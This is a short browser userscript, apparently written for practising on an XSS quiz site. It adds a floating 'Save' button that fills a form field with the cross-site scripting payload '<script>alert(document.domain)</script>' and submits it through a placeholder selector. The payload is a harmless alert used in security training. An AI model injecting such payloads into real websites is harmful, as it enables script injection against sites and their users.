// ==UserScript
// @name testName //namespace anonDeveloper 
//@ description DESCRIPTION BLAH
// @include https://xss-quiz.int21h.jp/
// ==/UserScript==
const path = "pathToElement"

let btn = document.createElement("button");
btn.innerHTML = "Save";
var button_width = 70;
var button_height = 30;
var buttonX = document.documentElement.clientWidth - button_width;
var buttonY = document.documentElement.clientHeight - document.documentElement.clientHeight;

//btn.style = "position:fixed; top:" + buttonY + "px; left:" + buttonX + "px; background-color: white; border: none; color: #8e8e8e; padding: 0px 0px; text-align: center; text-decoration: none; font-family: ; display: inline-block; font-size: 20px; margin: 0px 0px; cursor: pointer; width: 30px; height: 30px";
btn.style = "position:fixed; top:" + buttonY + "px; left:" + buttonX + "px; background-color: #00ccff; border-radius: 20px; font-size: 20px; cursor: pointer; width:" + button_width + "px; height:" + button_height + "px";
btn.style.opacity = "0.5";

btn.onclick = function () {
    document.getElementsByName("p1")[0].value = "<script>alert(document.domain)</script>;"
    document.querySelector(path).click()
};

document.body.appendChild(btn);

















/*
// Close the dropdown menu if the user clicks outside of it
window.onclick = function(event) {
  if (!event.target.matches('.dropbtn')) {
    var dropdowns = document.getElementsByClassName("dropdown-content");
    var i;
    for (i = 0; i < dropdowns.length; i++) {
      var openDropdown = dropdowns[i];
      if (openDropdown.classList.contains('show')) {
        openDropdown.classList.remove('show');
      }
    }
  }
}
*/